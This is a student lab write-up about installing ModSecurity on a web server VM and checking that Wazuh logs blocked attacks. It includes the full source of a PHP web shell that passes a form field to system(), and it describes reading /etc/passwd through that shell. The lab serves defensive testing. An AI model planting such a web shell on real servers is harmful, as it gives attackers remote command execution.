# Lab #5: ModSecurity with Wazuh

## Downloading ModSecurity on Web01

Before continuing with the lab I needed to add ModSecurity to the web0-1 VM so that I can have the necessary files and dependencies that are needed. The one hitch with this process though is that I created a bunch of firewall rules that prevent web01 from accessing the outbound internet. In order to fix this I had to add two new firewall rules temporarily:

* WAN to DMZ
  * Allow established connections
* DMZ to WAN
  * Allow all traffic through the firewall
  * Set rule to number 999 or something memorable for later deletion

With these rules configured on each end of the firewall my web01 VM is now able to temporarily access the internet.

With this I then downloaded the necessary packets and dependencies needed for this lab. The following command installs all of them in one go:

```
sudo dnf install mod_security mod_security_crs php php-common php-opcache php-cli php-gd php-curl php-mysqlnd -y
```

## Deliverable 1

The following screenshot is from the httpd error logs showing that ModSecurity was installed onto the service but not yet configured for anything.&#x20;

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

## Configuring ModSecurity

The first task that I set out to do with ModSecurity is to allow the browsing of the webpage via IP. In some cases this is possible without configurations but in other you have to explicitly have to allow it in the ModSecurity configurations.

If it is the case that ModSecurity is preventing browsing via IP like it was for me, the following rule can be added to the local\_rules file to allow this action where the IP address is the address of the web server:

```
SecRule REMOTE_ADDR "@ipMatch 172.16.50.3" "id:200000001,phase:1,nolog,allow"
```

To verify, I went over to my rw01 on the WAN and tested to make sure that I could still browse and access the webpage using curl for now. The two screenshots that follow prove this ability.

## Deliverable 2

The following screenshot shows me accessing my webpage via curl and via the browser from rw01 after making the changes to ModSecurity. In order from top to bottom in the highlighted zones is the browser accessing my webpage via IP, the terminal accessing the webpage via IP and wget, and the hostname of the current system (rw01).

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Adding a WebShell to Web01

Now that I have the basics of ModSecurity installed and I can successfully browse the webpage still form the WAN, it was time to test the limits of ModSecurity and install a web shell to web01 so that I can eventually execute some malicious commands on this and test how ModSecurity can handle these with Wazuh which should be logging all of these denials.

In order to add the web shell, I added this one php file and called it index.php. This is different than other web shells that I have previously made where the php is in another file from the form but I wanted the php to execute and print in the same page.&#x20;

```html
<html>
<title>
Simple Web Shell
</title>
<body>
<h2>Command To Execute</h2>
<form method="POST" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_POST['cmd'])) {
system($_POST['cmd'] . ' 2>&1);
}
?>
</pre>
</body>
</html>
```

Once added to my webpage in the /var/www/html path, I restarted my service and opened the page from my browser on rw01. The page itself can be seen in the screenshot below.&#x20;

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Deliverable 3

The screenshot below is of the command that I chose to execute, in my case the "ip a" command, executed and outputted to the web shell. I did have to be explicit with the path for the command as seen in the first highlighted field in the screenshot.

<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Deliverable 4

Now that I had a working web shell, I attempted to run the command "car /etc/passwd" in the terminal in an attempt to access material that is traditionally off limits to the average Linux user because it holds sensitive information. The following screenshots show before and after running the command on my web shell.&#x20;

<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

## Deliverable 5

After running the command, I attempted to look through the apache error\_log file to find the associated error with this attempt to run a malicious command from the web shell.&#x20;

The following screenshot is of that error found in the error log. I found this much easier by determining which ModSecurity request filter was triggered and then grepped for that phrase. In this case, it was under request rule 949.

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

## Deliverable 6

The following screenshots are of my Wazuh security events page showing the logged event with the web shell execution with the exact same captured log from this error\_log file.&#x20;

It is also important to note that two errors were logged by Wazuh showing the 400 response and the ModSecurity event trigger as seen in the first screenshot.

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
